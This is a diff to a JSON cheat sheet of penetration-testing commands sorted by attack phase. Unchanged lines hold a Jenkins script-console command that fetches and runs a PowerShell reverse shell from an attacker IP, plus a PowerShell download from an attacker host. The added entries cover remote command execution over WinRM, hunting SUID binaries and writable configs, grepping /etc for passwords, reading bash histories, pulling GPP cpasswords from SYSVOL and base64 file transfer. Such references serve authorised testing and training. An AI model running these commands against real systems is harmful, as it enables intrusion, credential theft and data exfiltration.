@@ -89,6 +89,11 @@
             "command": "groovy> cmd = \"powershell iex (New-Object Net.WebClient).DownloadString('[attacker ip]:[attacker web port]/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [attacker ip] -Port [attacker listening port]\"<br><br>groovy> cmd.execute()",
             "section": "Initial Access",
             "description": "If you have access to the Jenkins webpage (requires login) you can get to the script console page. This page will execute groovy commands which can be utilized to perform remote code execution. By utilizing nishang powershell scripts (specifically the reverse shell module Invoke-PowerShellTcp.ps1), you can load the script and execute it to gain initial access. The above command requires the attacker machine to have a webserver running with nishang's Invoke-PowerShellTcp.ps1 module."
+        },
+        {
+            "command": "winrs -r:192.168.1.9 -u:[domain\\user] -p:[password] [command]",
+            "section": "Initial Access",
+            "description": "Run arbitrary commands if WinRM is open."
         }
     ],
 
@@ -133,6 +138,11 @@
 
     "discovery":
     [
+        {
+            "command": "arp -a",
+            "section": "Discovery",
+            "description" : "Check network configuration/see recently connected systems."
+        },
         {
             "command": "whoami /priv <br><br> whoami /all",
             "section": "Discovery",
@@ -195,7 +205,7 @@
         },
         {
             "command": "Check /etc/crontab",
-            "section": "Privilege Escalation",
+            "section": "Discovery",
             "description": "[Linux] Check the /etc/crontab file to view scheduled tasks running on the system."
         },
         {
@@ -209,6 +219,31 @@
             "description": "[Linux] Finds all files starting from the directory supplised that is owned by the group. The output is piped to a grep -v command to exclude files that are flagged as permission denied."
         },
         {
+            "command": "find / -perm -4000 -o -perm -2000 -ls 2>/dev/null",
+            "section": "Discovery",
+            "description": "[Linux] Search for SETUID (-4000) or SETGID (-2000) bit set."
+        },
+        {
+            "command": "find /etc -perm -2",
+            "section": "Discovery",
+            "description": "[Linux] Check writeable config files."
+        },
+        {
+            "command": "find /home -name .bash_history -perm -4 2>/dev/null",
+            "section": "Discovery",
+            "description": "[Linux] Check readable bash history files."
+        },
+        {
+            "command": "grep -Inri passw /etc/* 2>/dev/null",
+            "section": "Discovery",
+            "description": "[Linux] Check files in /etc/ that have the string passw."
+        },
+        {
+            "command": "lsof -Pni",
+            "section": "Discovery",
+            "description": "[Linux] Check network/recently connected systems."
+        },
+        {
             "command": "netstat -tulp",
             "section": "Discovery",
             "description": "[Linux] Utilizes the netstat command to look for tcp (the t in the command) and udp (the u in the command) ports that are listening (l) and prints output with program names (p)."
@@ -217,11 +252,31 @@
             "command": "ssh -L localhost:[local port]:[victim ip]:[victim port] [name]@[victim ip]",
             "section": "Discovery",
             "description": "Reverse SSH tunnel to an internal webpage used by victim. Upon doing this command you can visit the webpage on your local (attacker) machine by going to the port you used in the [local port] portion. Tunnels traffic on victim port to attacker ip/port via SSH."
+        },
+        {
+            "command": "findstr /S cpassword %LOGONSERVER%\\sysvol\\*.xml",
+            "section": "Discovery",
+            "description": "[Windows] Check sysvol for GPP passwords (can be decrypted since key is public)."
+        },
+        {
+            "command": "ipconfig /displaydns",
+            "section": "Discovery",
+            "description": "[Windows] Check recently connected systems."
+        },
+        {
+            "command": "netstat -na",
+            "section": "Discovery",
+            "description": "[Windows] Check recently connected systems."
         }
     ],
 
     "file":
     [
+        {
+            "command": "cat [file] | base64<br><br>echo \"[base64 output]\" | base64 -d > file",
+            "section": "Exfiltration/File Movement",
+            "description": "Convert file/executable to base64, then to download it decode the base64 and output to file."
+        },
         {
             "command": "powershell -c \"Invoke-WebRequest [attacker ip]:[attacker web port]/[file] -OutFile [file]\"",
             "section": "Exfiltration/File Movement",
